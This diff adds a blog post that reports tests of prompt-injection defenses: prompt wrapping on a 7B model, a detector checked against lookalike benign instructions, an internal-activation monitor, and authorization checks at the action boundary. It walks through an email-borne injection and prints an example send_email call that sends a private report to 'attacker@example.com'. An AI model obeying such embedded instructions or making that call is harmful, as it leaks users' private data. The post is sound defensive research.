@@ -1,0 +1,111 @@
+import ScrollFigure from '@/components/mdx/ScrollFigure'
+import MarginNote from '@/components/mdx/MarginNote'
+import PromptDefenseOutcomeFigure from '@/components/mdx/PromptDefenseOutcomeFigure'
+import PromptDetectorControlFigure from '@/components/mdx/PromptDetectorControlFigure'
+import PromptReadoutCausalityFigure from '@/components/mdx/PromptReadoutCausalityFigure'
+import PromptActionBoundaryFigure from '@/components/mdx/PromptActionBoundaryFigure'
+
+export const meta = {
+  title: 'prompt injection defense should not end at the model',
+  date: '2026-08-01',
+  slug: 'prompt-injection-defense-inside-model-en',
+  readingTime: 7,
+  language: 'en',
+  alternateSlug: 'prompt-injection-defense-inside-model',
+  listed: false,
+  excerpt: "i tested prompt injection defenses at the model, the detector, and the action boundary, then asked where the application should stop the attack if the model can't.",
+}
+
+Imagine you ask an llm to read an email and prepare a reply.
+
+Inside the email, someone has written another instruction. It asks the model to send a private document to a new address. You did not ask for this. The person who wrote the email did.
+
+The model now has two instructions in the same context. One came from you. The other arrived through data you asked it to read.
+
+This is indirect prompt injection. The attacker can leave an instruction in an email, webpage, document, support ticket, or tool result. Your application retrieves it and brings the attack to the model.
+
+We already know this works. [*Not what you've signed up for*](https://arxiv.org/abs/2302.12173) demonstrated it against llm applications in 2023. [AgentDojo](https://arxiv.org/abs/2406.13352) later tested attacks in email, banking, travel, and tool environments. [LLMail-Inject](https://arxiv.org/abs/2506.09956) collected more than 200,000 attacks against an email assistant.
+
+So I did not want to ask whether prompt injection exists. I wanted to understand where an application should stop it: at the model, at a detector, or around the action the model wants to take.
+
+## start with the model
+
+Most llm applications put instructions and data into one stream of tokens, then expect the model to preserve the boundary. Defenses such as [Spotlighting](https://arxiv.org/abs/2403.14720), [StruQ](https://arxiv.org/abs/2402.06363), and [The Instruction Hierarchy](https://arxiv.org/abs/2404.13208) make that boundary clearer through input transformations, separate channels, or training.
+
+I tested a simple version on Qwen2.5-7B-Instruct. The model was doing classification tasks, and the untrusted text contained a second task. Without a system prompt, the attacker's task appeared in 94 of 96 answers.
+
+I then escaped the untrusted text inside an xml block, described it as data, and repeated the trusted task after the block. The attacker's task appeared in 12 answers. The user's task rose from 42 to 84.
+
+<MarginNote>The 96-output counts use provisional AI annotation. Three isolated agent contexts agreed on all 84 shared examples, but they are still contexts from the same model family, not independent humans.</MarginNote>
+
+<ScrollFigure n={1} caption="The prompt defense changed which task appeared in the answer. The same 96 attacks were used before and after the defense.">
+  <PromptDefenseOutcomeFigure />
+</ScrollFigure>
+
+This was a large improvement. It was also one 7b model, one controlled task family, and a fixed attack set. [Adaptive attacks](https://arxiv.org/abs/2503.00061) have bypassed defenses that looked strong against static benchmarks. I would use this prompt construction, but I would keep testing what gets through.
+
+## then, test the detector with a harder control
+
+I ran Meta's Prompt Guard 2 at its frozen default threshold. Against ordinary clean prose, it looked precise: no false positives in 64 examples.
+
+Then I replaced clean prose with harmless instructions written like the attacks. They had the same position, wrapper, style, and approximate length, but they supported the user's task instead of redirecting it.
+
+<ScrollFigure n={2} caption="Prompt Guard on the matched control. The harmless lookalikes were flagged slightly more often than the real attacks.">
+  <PromptDetectorControlFigure />
+</ScrollFigure>
+
+On this set, the detector separated ordinary prose from instruction-like text. It did not separate a redirecting instruction from a harmless one with the same shape.
+
+That is the detector lesson for me. Test on the legitimate traffic that looks most like an attack, then choose a false-positive rate the application can actually live with. A clean-text benchmark and one AUROC number are not enough.
+
+## if you have the weights, look inside
+
+An API user usually cannot inspect hidden states. With an open-weight model, we can ask whether the attack leaves a readable difference before the model produces an unsafe action.
+
+I tested this on Llama 3.1 8B. The same external instruction appeared in two conditions. In one, the trusted user request authorized its action. In the other, it did not. This let me measure the security-relevant difference without comparing instruction-like text to clean prose again.
+
+[Meta SecAlign](https://arxiv.org/abs/2507.02735), a trained model-level defense, reduced the unauthorized source effect by 46 percent while keeping the authorized action grounded. But an internal direction fitted on eight pilot examples still separated the two conditions on 24 held-out cases. Its AUROC was `0.9899` before the defense and `0.9823` at full defense, against a grouped-null 95th percentile of `0.5902`.
+
+So I had a stable readout. Its observational relation to the action margin also repeated on the held-out set. I registered a causal test and changed the model along that direction. The sign predicted a positive effect. The measured effect at the primary intervention strength was `−0.0465`.
+
+<ScrollFigure n={3} caption="The defense helped, the internal readout remained, and the registered causal prediction failed. The controls also block a reverse-mechanism claim.">
+  <PromptReadoutCausalityFigure />
+</ScrollFigure>
+
+I cannot call this a mechanism with the opposite sign. The intervention did not beat the grouped label-swap control, and the full-state positive control was uncertain. The narrower result is enough: a detector can find a stable internal signal without identifying the direction that drives the model's choice.
+
+An internal monitor may still be useful as an alarm. Its score should not become permission to send data, spend money, or call a tool.
+
+## move the final check closer to the action
+
+An input detector asks whether some text looks like an attack. An action check can ask a narrower question: did the user authorize this recipient, tool, destination, and data flow?
+
+[CaMeL](https://arxiv.org/abs/2503.18813) builds around this idea. It derives control and data flow from the trusted request, then uses capabilities to restrict what tools can do with private data. The application does not have to trust the model to identify every attack before enforcing the boundary.
+
+Suppose the model proposes:
+
+```text
+send_email(
+  recipient="attacker@example.com",
+  attachment="private-report.pdf"
+)
+```
+
+Ordinary code can check whether that recipient was authorized, whether the file may leave its current boundary, whether the tool is available, and whether a person must confirm the action. Perfect JSON is not enough. The action still has to be allowed.
+
+<ScrollFigure n={4} caption="Each layer answers a different question. The final authorization check uses trusted application state outside the model that read the attack.">
+  <PromptActionBoundaryFigure />
+</ScrollFigure>
+
+If I were building this as an API user, I would keep four things visible:
+
+1. **Source.** Track which text came from the user, the application, a retrieved document, or a tool. Show that boundary to the model.
+2. **Detector limits.** Test instruction-like benign traffic from the real application, not only clean prose.
+3. **Explicit actions.** Make the model name the tool, arguments, recipient, destination, and data it wants to use. Authorize them outside the model.
+4. **Cost.** Ask for confirmation before sending data, spending money, deleting files, or changing permissions.
+
+Current guidance from [OpenAI](https://openai.com/index/designing-agents-to-resist-prompt-injection/) and [Anthropic](https://www.anthropic.com/research/trustworthy-agents) points in the same direction: reduce permissions, monitor tool use, and put confirmation around important actions.
+
+I started by asking how to make the model resist prompt injection. The more useful question became what happens when resistance fails.
+
+The model can propose what to do next. It should not be the only thing deciding whether that action is allowed.
